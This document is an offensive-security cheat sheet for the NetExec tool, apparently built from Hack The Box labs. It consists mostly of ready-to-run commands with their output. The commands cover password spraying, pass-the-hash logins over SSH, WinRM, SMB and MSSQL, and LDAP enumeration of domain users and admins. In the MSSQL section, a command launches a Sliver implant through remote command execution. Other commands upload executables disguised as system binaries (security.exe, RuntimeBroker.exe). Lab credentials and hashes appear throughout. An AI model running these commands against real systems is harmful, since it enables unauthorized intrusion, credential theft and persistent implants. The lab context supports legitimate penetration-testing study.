# NetExec

### SSH

* attempt ssh authentication to multiple hosts with one set of credentials&#x20;

```
./nxc ssh targets.txt -u james -p password123
./nxc ssh targets.txt -u balthazar -p 'password123'
./nxc ssh targets.txt -u root -p asdfghjkl
```

* attempt ssh auth to any host in a subnet with one set of credentials&#x20;

```
./nxc ssh 172.16.1.0/24 -u james -p password123
```

### WINRM

* attempt winrm authentication to multiple hosts with one set of credentials&#x20;

```
./nxc winrm targets.txt -u balthazar -p 'abc123!!!'
# domain authentication
./nxc winrm targets.txt -u 'HTB.local\balthazar' -p 'abc123!!!' 
./nxc winrm targets.txt -u 'HTB.local\james' -p password123
```

* attempt winrm authentication to a domain with a username and hash

```
./nxc winrm targets.txt -d HTB.local -u blake -H 12f18eteb6f8187fa52f3f729896bbb7
./nxc winrm targets.txt -u Administrator -H b99ed3c3d34c4576bcd33c76420be934
```

* winrm with a single username and a password wordlist

```
./nxc winrm 172.16.1.101 -u dan.hard -p 172.16.1.101/passwordlist.txt 
```

### SMB

* attempt smb authentication to multiple hosts with one set of credentials&#x20;

```
./nxc smb targets.txt -u 'HTB.local\james' -p password123
```

* attempt ssh authentication with a keyfile instead of a password

```
./nxc ssh 172.16.1.0/24 -u root --key-file ./10.10.110.100/ssh/id_rsa -p ''
```

* attempt smb auth to any host in a subnet with anonymous logon&#x20;

```
./nxc smb 172.16.1.0/24 -u anonymous -p ''
```

* smb authentication to a domain with a specific username and attempt a password wordlist

```
./nxc smb 172.16.1.13 -d DANTE.local -u 'gerald' -p /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt 
```

* attempt to authenticate with a known/potential password against a username list

```
./nxc smb 10.10.11.35 -d cicada.htb -u ~/Documents/htb/cicada/loot/users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' 
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [+] CICADA\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 

```

### MSSQL&#x20;

* Access MSSQL and run a command with a password&#x20;

```
./nxc mssql 172.16.1.5 -u sophie -p thisisagoodpassword-X whoami --local-auth
MSSQL       172.16.1.5      1433   DANTE-SQL01      [*] Windows 10.0 Build 14393 (name:DANTE-SQL01) (domain:DANTE-SQL01)
MSSQL       172.16.1.5      1433   DANTE-SQL01      [+] sophie:thisisagoodpassword(Pwn3d!)
MSSQL       172.16.1.5      1433   DANTE-SQL01      [+] Executed command via mssqlexec
MSSQL       172.16.1.5      1433   DANTE-SQL01      nt service\mssql$sqlexpress
```

* kick off a sliver implant in the background&#x20;

```
./nxc mssql 172.16.1.5 -u sophie -p thisisagoodpassword-X 'cmd.exe /c start /b C:\Windows\System32\spool\drivers\color\security.exe' --local-auth
[*] Session b00d3dc6 dante-dc01 - 10.10.14.3:33086 (DANTE-SQL01) - windows/amd64 - Sun, 19 May 2024 13:48:24 EDT
```

### Put file

<pre><code><strong>./nxc smb 172.16.1.13 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:d0629f5539666892bf9ba9b34daa125c --put-file /opt/wmiexec2/RuntimeBroker.exe \\xampp\\apache\\bin\\iconv\\RuntimeBroker.exe
</strong><strong>
</strong>./nxc mssql 172.16.1.5 -u sophie -p thisisapassword --put-file /home/ubuntu/Documents/htb/dante/security.exe 'C:\Windows\System32\spool\drivers\color\security.exe' --local-auth

</code></pre>

### LDAP

* attempt authentication to ldap with a username list and a valid password

```
./nxc ldap 10.10.11.35 -d cicada.htb -u ~/Documents/htb/cicada/loot/users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' 
```

* list of users and computers with flag TRUSTED\_FOR\_DELEGATION

```
./nxc ldap 10.10.11.35 -d cicada.htb -u 'CICADA\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --trusted-for-delegation
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.35     389    CICADA-DC        [+] CICADA\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.10.11.35     389    CICADA-DC        CICADA-DC$
```

* get admin count and their usernames&#x20;

```
./nxc ldap 10.10.11.35 -d cicada.htb -u 'CICADA\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --admin-count           
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.35     389    CICADA-DC        [+] CICADA\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.10.11.35     389    CICADA-DC        Administrator
LDAP        10.10.11.35     389    CICADA-DC        Administrators
LDAP        10.10.11.35     389    CICADA-DC        Print Operators
LDAP        10.10.11.35     389    CICADA-DC        Backup Operators
LDAP        10.10.11.35     389    CICADA-DC        Replicator
LDAP        10.10.11.35     389    CICADA-DC        krbtgt
LDAP        10.10.11.35     389    CICADA-DC        Domain Controllers
LDAP        10.10.11.35     389    CICADA-DC        Schema Admins
LDAP        10.10.11.35     389    CICADA-DC        Enterprise Admins
LDAP        10.10.11.35     389    CICADA-DC        Domain Admins
LDAP        10.10.11.35     389    CICADA-DC        Server Operators
LDAP        10.10.11.35     389    CICADA-DC        Account Operators
LDAP        10.10.11.35     389    CICADA-DC        Read-only Domain Controllers
LDAP        10.10.11.35     389    CICADA-DC        Key Admins
LDAP        10.10.11.35     389    CICADA-DC        Enterprise Key Admins
LDAP        10.10.11.35     389    CICADA-DC        Dev Support
LDAP        10.10.11.35     389    CICADA-DC        emily.oscars
```

* get users on the box, passwords can be in the comment field&#x20;

```
./nxc ldap 10.10.11.35 -d cicada.htb -u 'CICADA\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.35     389    CICADA-DC        [+] CICADA\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.10.11.35     389    CICADA-DC        [*] Enumerated 8 domain users: CICADA
LDAP        10.10.11.35     389    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-      
LDAP        10.10.11.35     389    CICADA-DC        Administrator                 2024-08-26 20:08:03 2       Built-in account for administering the computer/domain
LDAP        10.10.11.35     389    CICADA-DC        Guest                         2024-08-28 17:26:56 2       Built-in account for guest access to the computer/domain
LDAP        10.10.11.35     389    CICADA-DC        krbtgt                        2024-03-14 11:14:10 3       Key Distribution Center Service Account
LDAP        10.10.11.35     389    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 2                          
LDAP        10.10.11.35     389    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 2                          
LDAP        10.10.11.35     389    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0                          
LDAP        10.10.11.35     389    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3
LDAP        10.10.11.35     389    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0  

```

* get groups on the machine via ldap&#x20;

```
./nxc ldap 10.10.11.35 -d cicada.htb -u 'CICADA\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --groups
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.35     389    CICADA-DC        [+] CICADA\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.10.11.35     389    CICADA-DC        Administrators
LDAP        10.10.11.35     389    CICADA-DC        Users
LDAP        10.10.11.35     389    CICADA-DC        Guests
LDAP        10.10.11.35     389    CICADA-DC        Print Operators
LDAP        10.10.11.35     389    CICADA-DC        Backup Operators
LDAP        10.10.11.35     389    CICADA-DC        Replicator
LDAP        10.10.11.35     389    CICADA-DC        Remote Desktop Users
LDAP        10.10.11.35     389    CICADA-DC        Network Configuration Operators
LDAP        10.10.11.35     389    CICADA-DC        Performance Monitor Users
LDAP        10.10.11.35     389    CICADA-DC        Performance Log Users
LDAP        10.10.11.35     389    CICADA-DC        Distributed COM Users
LDAP        10.10.11.35     389    CICADA-DC        IIS_IUSRS
LDAP        10.10.11.35     389    CICADA-DC        Cryptographic Operators
LDAP        10.10.11.35     389    CICADA-DC        Event Log Readers
LDAP        10.10.11.35     389    CICADA-DC        Certificate Service DCOM Access
LDAP        10.10.11.35     389    CICADA-DC        RDS Remote Access Servers
LDAP        10.10.11.35     389    CICADA-DC        RDS Endpoint Servers
LDAP        10.10.11.35     389    CICADA-DC        RDS Management Servers
LDAP        10.10.11.35     389    CICADA-DC        Hyper-V Administrators
LDAP        10.10.11.35     389    CICADA-DC        Access Control Assistance Operators
LDAP        10.10.11.35     389    CICADA-DC        Remote Management Users
--snip--
```

* enumerate domain controllers

```
./nxc ldap 10.10.11.35 -d cicada.htb -u 'CICADA\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --dc-list
```

* get active users (non expired) via ldap&#x20;

```
./nxc ldap 10.10.11.35 -d cicada.htb -u 'CICADA\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --active-users
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.35     389    CICADA-DC        [+] CICADA\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.10.11.35     389    CICADA-DC        [*] Total records returned: 7, total 1 user(s) disabled
LDAP        10.10.11.35     389    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-      
LDAP        10.10.11.35     389    CICADA-DC        Administrator                 2024-08-26 20:08:03 2       Built-in account for administering the computer/domain
LDAP        10.10.11.35     389    CICADA-DC        Guest                         2024-08-28 17:26:56 2       Built-in account for guest access to the computer/domain
LDAP        10.10.11.35     389    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 2                          
LDAP        10.10.11.35     389    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 2                          
LDAP        10.10.11.35     389    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0                          
LDAP        10.10.11.35     389    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3
LDAP        10.10.11.35     389    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0    

```

* get bloodhound scan via ldap remote with net-exec

```
./nxc ldap 10.10.11.35 -d cicada.htb --dns-server 10.10.11.35 -u 'CICADA\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --bloodhound
```

